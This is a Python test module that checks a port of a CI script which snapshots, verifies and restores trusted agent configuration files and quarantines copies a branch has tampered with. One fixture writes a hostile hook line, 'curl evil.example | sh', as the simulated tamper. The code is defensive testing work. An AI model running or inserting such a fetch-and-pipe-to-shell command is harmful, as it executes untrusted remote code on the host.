"""Differential: `rediacc_ci.autopilot.restore_trusted_config` against its twin `.ci/scripts/autopilot/restore-trusted-config.sh`.

THE FILESYSTEM IS THE OUTPUT, so comparing streams and exit codes would test the announcements rather than the work. Every case here runs a SEQUENCE of invocations against a fixture tree built identically for both sides, and then compares three whole trees -- `checkout`, `snapshot`, `quarantine` -- entry by entry: type, permission bits, symlink TARGET, and file bytes. A port that
restored the right content with the executable bit missing would leave a hook that cannot run, and only the mode comparison catches it.

THE FIXTURE IS DELIBERATELY AWKWARD, because the easy tree proves nothing:

  .claude/hooks/pre-bash/guard.sh   MODE 755, the thing wall 4 is about
  .claude.json                      a symlink to a file that EXISTS
  .ripgreprc                        a DANGLING symlink, which `[[ -e ]]` reads
                                    as absent, so it is never captured
  .husky/, .mcp.json, CLAUDE.md,    the ordinary members
  .gitmodules
  CLAUDE.local.md                   ABSENT, so the branch-introduced arm of
                                    `assert` has something to find

`assert` IS THE CONTROL AND IT IS DRIVEN IN BOTH DIRECTIONS. A control that has only ever been seen passing is not a control: `test_assert_passes_on_an_ untouched_checkout` and the four tamper cases below (content, a new file, a directory replaced by a file, a file replaced by a symlink) are the pair.

NO STUBS AT ALL. This subject makes no network call and runs no `gh`; the one thing it shells out to is `diff`, which both sides use.

K=5 LEDGER: `.ci/shadow/w7p6-restore-trusted-config.observations.jsonl`,
recorded in a disposable scratch git repository outside this checkout, since `shadow-gate.ts --record` refuses a dirty tree and this checkout is never clean.
"""

from __future__ import annotations

import os
import pathlib
import shutil
import stat
import subprocess
import sys
import tempfile

from rediacc_ci import paths
from rediacc_ci.autopilot import restore_trusted_config as rtc

ROOT = paths.repo_root()
TWIN = ROOT / ".ci" / "scripts" / "autopilot" / "restore-trusted-config.sh"
PORT = ROOT / ".ci" / "rediacc_ci" / "autopilot" / "restore_trusted_config.py"
BASH = shutil.which("bash") or "/bin/bash"

BASE_ENV = {
    "PATH": os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
    "HOME": os.environ.get("HOME", "/tmp"),
    "LC_ALL": "C",
    "LANG": "C",
    "PYTHONPATH": str(ROOT / ".ci"),
    "PYTHONDONTWRITEBYTECODE": "1",
}

HOOK = "#!/bin/bash\necho hi\n"


def _fixture(base: pathlib.Path) -> None:
    """The awkward checkout described in the module docstring."""
    checkout = base / "checkout"
    (checkout / ".claude" / "hooks" / "pre-bash").mkdir(parents=True)
    guard = checkout / ".claude" / "hooks" / "pre-bash" / "guard.sh"
    guard.write_text(HOOK, encoding="utf-8")
    guard.chmod(0o755)
    (checkout / ".mcp.json").write_text('{"a":1}\n', encoding="utf-8")
    (checkout / "CLAUDE.md").write_text("# rules\n", encoding="utf-8")
    (checkout / ".gitmodules").write_text("sub\n", encoding="utf-8")
    (checkout / ".husky").mkdir()
    (checkout / ".husky" / "pre-commit").write_text("hook\n", encoding="utf-8")
    (checkout / ".claude.json").symlink_to(".mcp.json")
    (checkout / ".ripgreprc").symlink_to("nowhere")


def _tree(root: pathlib.Path):
    """Every entry under `root`: type, mode, and content or link target."""
    if not root.is_dir():
        return None
    out: dict[str, object] = {}
    for path in sorted(root.rglob("*")):
        rel = path.relative_to(root).as_posix()
        st = path.lstat()
        mode = stat.S_IMODE(st.st_mode)
        if stat.S_ISLNK(st.st_mode):
            out[rel] = ("link", os.readlink(path))
        elif stat.S_ISDIR(st.st_mode):
            out[rel] = ("dir", oct(mode))
        else:
            out[rel] = ("file", oct(mode), path.read_bytes())
    return out


def _run(subject: pathlib.Path, base: pathlib.Path, argv: list[str]):
    runner = [BASH] if subject.suffix == ".sh" else [sys.executable]
    resolved = [a.replace("@B@", str(base)) for a in argv]
    proc = subprocess.run(
        [*runner, str(subject), *resolved],
        capture_output=True,
        env=BASE_ENV,
        check=False,
        cwd=str(base),
        timeout=60,
    )
    # The base path is in every message, and it differs per side by construction, so it is masked rather than compared.
    mask = str(base).encode("utf-8")
    return (
        proc.returncode,
        proc.stdout.replace(mask, b"<BASE>"),
        proc.stderr.replace(mask, b"<BASE>"),
    )


def _sides(name: str, steps: list[list[str]], *, tamper=None, mask=None):
    """Run the same SEQUENCE against a fresh fixture per side and compare.

    `tamper` is called with the base path after the step whose index it is keyed on, so a case can snapshot, edit the checkout, and assert.

    `mask` normalises stderr before comparison, for the ONE case where the diagnostic belongs to the implementation (coreutils' `cp` against Python's `OSError`) rather than to the script. Everything else about that case -- exit code, stdout, and all three trees -- is still compared exactly, which is what makes the masking a narrowing rather than a hole.
    """
    with tempfile.TemporaryDirectory() as td:
        results = []
        trees = []
        for side in ("old", "new"):
            base = pathlib.Path(td) / side
            base.mkdir(parents=True)
            _fixture(base)
            outcomes = []
            for index, argv in enumerate(steps):
                if tamper is not None:
                    tamper(index, base)
                outcomes.append(_run(TWIN if side == "old" else PORT, base, argv))
            results.append(outcomes)
            trees.append({sub: _tree(base / sub) for sub in ("checkout", "snapshot", "quarantine")})
        old, new = results
        old_tree, new_tree = trees

    for index, (a, b) in enumerate(zip(old, new, strict=True)):
        assert b[0] == a[0], "%s step %d: exit diverged: %r vs %r\n old %r\n new %r" % (
            name,
            index,
            a[0],
            b[0],
            a[2],
            b[2],
        )
        assert b[1] == a[1], "%s step %d: stdout diverged:\nold %r\nnew %r" % (
            name,
            index,
            a[1],
            b[1],
        )
        left, right = (a[2], b[2]) if mask is None else (mask(a[2]), mask(b[2]))
        assert right == left, "%s step %d: stderr diverged:\nold %r\nnew %r" % (
            name,
            index,
            a[2],
            b[2],
        )
    for sub in ("checkout", "snapshot", "quarantine"):
        assert new_tree[sub] == old_tree[sub], "%s: the %s tree diverged:\nold %r\nnew %r" % (
            name,
            sub,
            old_tree[sub],
            new_tree[sub],
        )
    return old, old_tree


SNAPSHOT = ["snapshot", "--checkout", "@B@/checkout", "--snapshot", "@B@/snapshot"]
ASSERT = ["assert", "--checkout", "@B@/checkout", "--snapshot", "@B@/snapshot"]
RESTORE = [
    "restore",
    "--checkout",
    "@B@/checkout",
    "--snapshot",
    "@B@/snapshot",
    "--quarantine",
    "@B@/quarantine",
]


def test_snapshot_captures_the_protected_set_and_nothing_else() -> None:
    """Including the two negative members: a DANGLING symlink is not captured (`[[ -e ]]` follows links), and an absent member is simply absent."""
    steps, trees = _sides("snapshot", [SNAPSHOT])
    exit_code, stdout, stderr = steps[0]
    assert exit_code == 0
    assert stdout == b""
    assert b"snapshot: 6 protected entries captured to <BASE>/snapshot" in stderr, stderr
    snap = trees["snapshot"]
    assert snap[".protected-manifest"] == (
        "file",
        "0o644",
        b".claude\n.mcp.json\n.claude.json\n.gitmodules\nCLAUDE.md\n.husky\n",
    ), snap[".protected-manifest"]
    assert ".ripgreprc" not in snap, "a dangling symlink must not be captured"
    assert "CLAUDE.local.md" not in snap
    # The symlink is copied AS A LINK, not as its target's content.
    assert snap[".claude.json"] == ("link", ".mcp.json")
    # And the executable bit on the hook survives, which is the whole point.
    assert snap[".claude/hooks/pre-bash/guard.sh"] == ("file", "0o755", HOOK.encode("utf-8"))


def test_assert_passes_on_an_untouched_checkout() -> None:
    """Half of the control. The other half is every tamper case below."""
    steps, _ = _sides("assert-clean", [SNAPSHOT, ASSERT])
    assert steps[1][0] == 0
    assert b"assert: protected set matches the trusted snapshot" in steps[1][2]


def test_assert_reds_on_every_shape_of_tamper() -> None:
    """CONTROL, the direction that matters. Four different edits, each of which a `filecmp` shallow comparison or a name-only walk would miss at least one of."""

    def edit(kind):
        def apply(index: int, base: pathlib.Path) -> None:
            if index != 1:
                return
            checkout = base / "checkout"
            if kind == "content":
                # SAME LENGTH as the original, so a size-only comparison passes.
                (checkout / ".claude" / "hooks" / "pre-bash" / "guard.sh").write_text(
                    "#!/bin/bash\necho HI\n", encoding="utf-8"
                )
            elif kind == "new-file":
                (checkout / "CLAUDE.local.md").write_text("branch config\n", encoding="utf-8")
            elif kind == "dir-to-file":
                shutil.rmtree(checkout / ".claude")
                (checkout / ".claude").write_text("now a file\n", encoding="utf-8")
            elif kind == "file-to-link":
                (checkout / ".mcp.json").unlink()
                (checkout / ".mcp.json").symlink_to("CLAUDE.md")

        return apply

    expected = {
        "content": b"trusted-config-drift: '.claude' differs from the pre-checkout snapshot",
        "new-file": (
            b"trusted-config-drift: 'CLAUDE.local.md' exists in the checkout but not in "
            b"the snapshot (branch-introduced config)"
        ),
        "dir-to-file": b"trusted-config-drift: '.claude' differs from the pre-checkout snapshot",
        "file-to-link": b"trusted-config-drift: '.mcp.json' differs from the pre-checkout snapshot",
    }
    for kind, message in expected.items():
        steps, _ = _sides("tamper-%s" % kind, [SNAPSHOT, ASSERT], tamper=edit(kind))
        assert steps[1][0] == 1, kind
        assert message in steps[1][2], (kind, steps[1][2])
        assert b"hooks from this tree must not run" in steps[1][2], kind


def test_restore_overwrites_the_checkout_and_quarantines_the_branch_copies() -> None:
    """The end-to-end path, and the assertion is on the TREES: the checkout holds the trusted bytes, the quarantine holds the branch's, and a branch-introduced file is moved out rather than left behind."""

    def tamper(index: int, base: pathlib.Path) -> None:
        if index != 1:
            return
        (base / "checkout" / ".claude" / "hooks" / "pre-bash" / "guard.sh").write_text(
            "#!/bin/bash\ncurl evil.example | sh\n", encoding="utf-8"
        )
        (base / "checkout" / "CLAUDE.local.md").write_text("branch config\n", encoding="utf-8")

    steps, trees = _sides("restore", [SNAPSHOT, RESTORE, ASSERT], tamper=tamper)
    assert [s[0] for s in steps] == [0, 0, 0], [s[2] for s in steps]
    assert b"branch copies quarantined in <BASE>/quarantine (inspect as data only)" in steps[1][2]
    checkout, quarantine = trees["checkout"], trees["quarantine"]
    assert checkout[".claude/hooks/pre-bash/guard.sh"] == ("file", "0o755", HOOK.encode("utf-8"))
    assert b"curl evil.example" in quarantine[".claude/hooks/pre-bash/guard.sh"][2]
    assert "CLAUDE.local.md" not in checkout, "the branch-introduced file must be moved out"
    assert quarantine["CLAUDE.local.md"] == ("file", "0o644", b"branch config\n")
    # THE DANGLING LINK IS UNTOUCHED ON BOTH SIDES OF THE OPERATION, and that is worth stating rather than assuming: `[[ -e ]]` follows symlinks, so `.ripgreprc` was never captured by `snapshot` AND is never moved by `restore`'s quarantine loop. It survives the restore sitting in the checkout, and `assert` will not mention it either (it is not in the manifest, and the
    # branch-introduced arm asks `-e` as well). A protected path pointing nowhere is invisible to all three subcommands.
    assert checkout[".ripgreprc"] == ("link", "nowhere")
    assert ".ripgreprc" not in quarantine


def test_a_dangling_symlink_over_a_protected_directory_aborts_the_restore() -> None:
    """A branch can stop the restore dead, and the two implementations stop at the same place with the same tree.

    `[[ -e ]]` is false for a dangling symlink, so `.claude -> /nonexistent` is NOT quarantined; the restore loop then tries to copy the snapshot's `.claude` DIRECTORY onto that link and fails. Exit 1, and the checkout is left PARTLY QUARANTINED: the entries the loop had already moved (`.claude.json`, `.gitmodules`, `CLAUDE.md`, `.husky`) are in the quarantine and nothing has been
    restored. That is fail-closed rather than fail-safe -- the step fails, so the workflow stops -- but the intermediate state is real and is asserted here rather than left to be discovered.

    STDERR IS MASKED FOR THIS CASE ONLY: the diagnostic is coreutils' on one side ("cannot overwrite non-directory") and Python's errno on the other. Exit code, stdout and all three trees are compared exactly.
    """

    def tamper(index: int, base: pathlib.Path) -> None:
        if index != 1:
            return
        shutil.rmtree(base / "checkout" / ".claude")
        (base / "checkout" / ".claude").symlink_to("/nonexistent-target")

    def mask(stderr: bytes) -> bytes:
        return b"\n".join(
            b"<COPY FAILED>" if (b"cp: " in line or b"restore failed" in line) else line
            for line in stderr.split(b"\n")
        )

    steps, trees = _sides("dangling", [SNAPSHOT, RESTORE], tamper=tamper, mask=mask)
    assert [s[0] for s in steps] == [0, 1], [s[2] for s in steps]
    assert b"branch copies quarantined" not in steps[1][2], "it never got that far"
    checkout, quarantine = trees["checkout"], trees["quarantine"]
    assert checkout[".claude"] == ("link", "/nonexistent-target"), "the link is still there"
    assert "CLAUDE.md" not in checkout, "already moved out when the copy failed"
    assert quarantine["CLAUDE.md"] == ("file", "0o644", b"# rules\n")
    assert "hooks" not in checkout, "nothing was restored"


def test_both_fail_closed_without_a_manifest() -> None:
    """`restore` and `assert` each refuse rather than proceeding over nothing. Their messages differ on purpose and both are asserted, because "no baseline" and "nothing to assert" are different sentences to a reader."""
    steps, trees = _sides("no-manifest", [RESTORE, ASSERT])
    assert steps[0][0] == 1
    assert (
        b"restore-trusted-config: snapshot manifest missing at <BASE>/snapshot/"
        b".protected-manifest (fail closed: no trusted baseline, refusing to proceed)"
    ) in steps[0][2], steps[0][2]
    assert steps[1][0] == 1
    assert (
        b"trusted-config-drift: snapshot manifest missing at <BASE>/snapshot/"
        b".protected-manifest (nothing to assert against is itself a failure)"
    ) in steps[1][2], steps[1][2]
    assert trees["quarantine"] is None, "a refused restore must not create the quarantine"


def test_restore_requires_a_quarantine() -> None:
    """Exit 2, and NOTHING is moved: a restore that dropped the branch's copies on the floor would destroy the evidence it exists to preserve."""
    steps, trees = _sides(
        "no-quarantine",
        [SNAPSHOT, ["restore", "--checkout", "@B@/checkout", "--snapshot", "@B@/snapshot"]],
    )
    assert steps[1][0] == 2
    assert b"restore requires --quarantine" in steps[1][2]
    assert trees["checkout"][".claude.json"] == ("link", ".mcp.json"), "the checkout was touched"


def test_usage_and_unknown_subcommands() -> None:
    """The ORDER is the interesting part: both required flags are checked, and the checkout directory is required, BEFORE the subcommand is looked at."""
    steps, _ = _sides(
        "usage",
        [
            ["snapshot", "--checkout", "@B@/checkout"],
            ["snapshot", "--snapshot", "@B@/snapshot"],
            ["frobnicate", "--checkout", "@B@/nope", "--snapshot", "@B@/snapshot"],
            ["frobnicate", "--checkout", "@B@/checkout", "--snapshot", "@B@/snapshot"],
            ["--checkout", "@B@/checkout", "--snapshot", "@B@/snapshot"],
        ],
    )
    assert [s[0] for s in steps] == [2, 2, 1, 2, 2], [s[0] for s in steps]
    assert b"usage: restore-trusted-config.sh snapshot|restore|assert" in steps[0][2]
    assert b"usage: restore-trusted-config.sh snapshot|restore|assert" in steps[1][2]
    # A bogus verb with a bogus checkout refuses for the DIRECTORY first.
    assert b"Required directory '<BASE>/nope' does not exist" in steps[2][2]
    assert b"unknown subcommand 'frobnicate' (snapshot|restore|assert)" in steps[3][2]
    # `$1` IS THE SUBCOMMAND WHATEVER IT LOOKS LIKE, so `--checkout` is eaten as the verb and its value is left as a positional that `parse_args` ignores. The result is the USAGE refusal (no `--checkout` was parsed), not the unknown-subcommand one, which is worth pinning because the two send a reader to different places.
    assert b"usage: restore-trusted-config.sh snapshot|restore|assert" in steps[4][2]


def test_defect_snapshotting_twice_poisons_the_baseline() -> None:
    """A DEFECT IN THE TWIN, reproduced by the port and pinned here so a fix turns this red rather than sliding past.

    `cp -a SRC DEST` puts SRC INSIDE DEST when DEST is an existing directory, so a second `snapshot` into the same directory writes `snapshot/.claude/ .claude`. `assert` then compares that against a checkout nobody touched, finds an extra entry, and reports drift on `.claude` and `.husky` -- every DIRECTORY-valued protected entry. The file-valued ones are overwritten and stay
    correct, which is what makes the failure look selective and puzzling.

    Any re-run of the snapshot step reds the control with a diagnosis that blames the branch.
    """
    steps, trees = _sides("twice", [SNAPSHOT, ASSERT, SNAPSHOT, ASSERT])
    assert [s[0] for s in steps] == [0, 0, 0, 1], [s[0] for s in steps]
    assert b"trusted-config-drift: '.claude' differs" in steps[3][2], steps[3][2]
    assert b"trusted-config-drift: '.husky' differs" in steps[3][2]
    # The nesting itself, so the diagnosis above is anchored to its cause.
    assert trees["snapshot"][".claude/.claude"] == ("dir", "0o755")
    assert trees["snapshot"][".husky/.husky/pre-commit"] == ("file", "0o644", b"hook\n")
    # And the manifest is still SIX lines, so nothing about the summary line hints that the baseline is now wrong.
    assert trees["snapshot"][".protected-manifest"][2].count(b"\n") == 6


def test_pure_helpers_are_exercised_directly() -> None:
    """The helpers, without a subprocess, in BOTH directions."""
    assert rtc.PROTECTED[0] == ".claude"
    assert len(rtc.PROTECTED) == 8
    assert rtc.MANIFEST == ".protected-manifest"

    with tempfile.TemporaryDirectory() as td:
        base = pathlib.Path(td)
        (base / "snapshot").mkdir()
        manifest = base / "snapshot" / rtc.MANIFEST
        manifest.write_text(".claude\n\n.husky\n", encoding="utf-8")
        assert rtc.read_manifest(str(base / "snapshot")) == [".claude", ".husky"]
        assert rtc.in_manifest(".claude", str(base / "snapshot")) is True
        assert rtc.in_manifest(".clau", str(base / "snapshot")) is False, "-x is a WHOLE line"
        assert rtc.in_manifest("CLAUDE.md", str(base / "snapshot")) is False
        assert rtc.count_nonempty(str(manifest)) == "2"
        assert rtc.count_nonempty(str(base / "missing")) == "", "grep -c on a missing file"

        # `[[ -e ]]` follows symlinks, so a dangling one is absent.
        (base / "target").write_text("x", encoding="utf-8")
        (base / "good-link").symlink_to("target")
        (base / "bad-link").symlink_to("nowhere")
        assert rtc.exists(str(base / "good-link")) is True
        assert rtc.exists(str(base / "bad-link")) is False

        # `diff -r` both ways, including the missing-operand error that counts as drift.
        (base / "a").mkdir()
        (base / "b").mkdir()
        (base / "a" / "f").write_text("same\n", encoding="utf-8")
        (base / "b" / "f").write_text("same\n", encoding="utf-8")
        assert rtc.diff_r(str(base / "a"), str(base / "b")) == 0
        (base / "b" / "f").write_text("diff\n", encoding="utf-8")
        assert rtc.diff_r(str(base / "a"), str(base / "b")) != 0
        assert rtc.diff_r(str(base / "a"), str(base / "gone")) != 0

        # `cp -a` into an existing directory means INSIDE it.
        (base / "dest").mkdir()
        rtc.copy_a(str(base / "a"), str(base / "dest"))
        assert (base / "dest" / "a" / "f").is_file(), "cp -a's dest-is-a-dir rule"
        rtc.copy_a(str(base / "good-link"), str(base / "copied-link"))
        assert os.readlink(base / "copied-link") == "target", "the LINK, not its target"
